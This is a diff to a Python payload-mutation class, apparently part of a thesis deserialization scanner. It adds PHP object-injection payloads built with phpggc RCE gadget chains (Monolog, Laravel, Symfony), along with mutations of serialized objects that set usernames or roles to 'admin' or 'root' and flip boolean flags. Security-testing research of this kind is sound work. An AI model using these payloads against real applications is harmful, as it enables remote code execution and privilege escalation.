@@ -1,7 +1,7 @@
 import subprocess
 import base64
 import os
-
+import re
 
 class PayloadMutation:
 
@@ -43,6 +43,10 @@ class PayloadMutation:
             return self._mutate_java()
         if self.probe == "urldns_probe":
             return self._mutate_java_urldns()
+        if self.probe == "gadget_chain":
+            return self._php_mutation()
+        if self.probe in ("flip_boolean", "modify_string","modify_integer"):  
+            return self.__mutated_php_choose()
         return []
 
 
@@ -98,16 +102,20 @@ class PayloadMutation:
             return None
 
     def _make_payload(self, ptype, chain, command, b64) -> dict:
-        return {
-            "type":     ptype,
-            "chain":    chain,
-            "command":  command,
-            "payload":  b64,
-            "location": self.vector.get("location"),
-            "name":     self.vector.get("name"),
-            "url":      self.vector.get("url"),
-        }
+        
+        url_safe = b64.replace('+', '%2B').replace('=', '%3D').replace('/', '%2F')
 
+        return {
+            "type":              ptype,
+            "chain":             chain,
+            "command":           command,
+            "payload":           b64,          
+            "payload_urlencoded": url_safe,   
+            "location":          self.vector.get("location"),
+            "name":              self.vector.get("name"),
+            "url":               self.vector.get("url"),
+            "encoding":          "base64",
+        }
 
     def _mutate_java(self) -> list[dict]:
         results = []
@@ -150,6 +158,8 @@ class PayloadMutation:
 
         return []
     
+    
+    ##PHP
     
     PHPGGC_PATH = "D:\\Thesis\\Analyze\\third_tool\\phpggc"
     
@@ -315,6 +325,8 @@ class PayloadMutation:
         "passthru",
         "unlink"
     }
+    
+    
     def _get_php_version(self) -> str:
         try:
             result = subprocess.run(["php", "-version"], capture_output=True, text=True)
@@ -339,7 +351,7 @@ class PayloadMutation:
             for ptype in self.PHP_TYPE:
                 for cmd in self.TEST_COMMANDS:
                     result = self._run_phpggc(chain, ptype, cmd)
-                    if results:
+                    if result:
                         results.append(self._make_payload("php_object", chain, cmd, result))
                         print(f"[+] Generated: {chain}")
                         
@@ -366,4 +378,76 @@ class PayloadMutation:
             if key.lower() in self.etype.lower() and chain:
                 return chain
         return ["Monolog/RCE1", "Laravel/RCE1", "Symfony/RCE1"]
+    
+    
+    def __flip_boolean(self, payload: str) -> list[dict]:
+        results = []
+        if "b:0" in payload:
+            mutated = payload.replace("b:0", "b:1")
+            encode_mutatedd = base64.b64encode(mutated.encode()).decode()
+            results.append(self._make_payload("flip_boolean", None, None,encode_mutatedd ))
+            
+        if "b:1" in payload:
+            mutated1 = payload.replace("b:1", "b:0")
+            encode_mutatedd1 = base64.b64encode(mutated1.encode()).decode()
+            results.append(self._make_payload("flip_boolean", None, None,encode_mutatedd1 ))
+            
+        return results
+    
+    def __modify_string(self, payload: str) -> list[dict]:
+        results = []
+        test_values = ["administrator", "admin", "root", "superuser"]
         
+        for m in re.finditer(r's:(\d+):"([^"]+)"', payload):
+            declared_len = int(m.group(1))
+            original_val = m.group(2)
+
+            all_hints = [
+                "username", "user", "email", "login", "name",
+                "role", "admin", "level", "access", "privilege"
+            ]
+            if not any(hint in payload[max(0, m.start()-20):m.start()].lower()
+                    for hint in all_hints):
+                continue
+
+            for new_val in test_values:
+                if new_val == original_val:
+                    continue
+                new_len = len(new_val)
+                new_str = f's:{new_len}:"{new_val}"'
+                mutated = payload.replace(m.group(0), new_str, 1)
+                encode_mutated = base64.b64encode(mutated.encode()).decode()
+                results.append(self._make_payload("modify_string", None, None,encode_mutated))
+            
+        
+        return results
+    
+    def _mutate_integer(self, payload: str) -> list[dict]:
+        results    = []
+        int_values = [1, 2, 99, 100, 9999]
+
+        import re
+        for m in re.finditer(r'i:(\d+);', payload):
+            original_val = int(m.group(1))
+            for new_val in int_values:
+                if new_val == original_val:
+                    continue
+                mutated2 = payload.replace(m.group(0), f'i:{new_val};', 1)
+                encode_mutated2 = base64.b64encode(mutated2.encode()).decode()
+                results.append(self._make_payload("modify_integer", None, None,encode_mutated2))
+
+        return results
+        
+        
+        
+    def __mutated_php_choose(self) -> list[dict]:
+        results = []
+        origin = self.vector.get("value", "")
+        if self.probe == "flip_boolean":
+            results += self.__flip_boolean(origin)
+        if self.probe == "modify_integer":
+            results += self._mutate_integer(origin)
+        if self.probe == "modify_string":
+            results += self.__modify_string(origin)
+            
+        return results
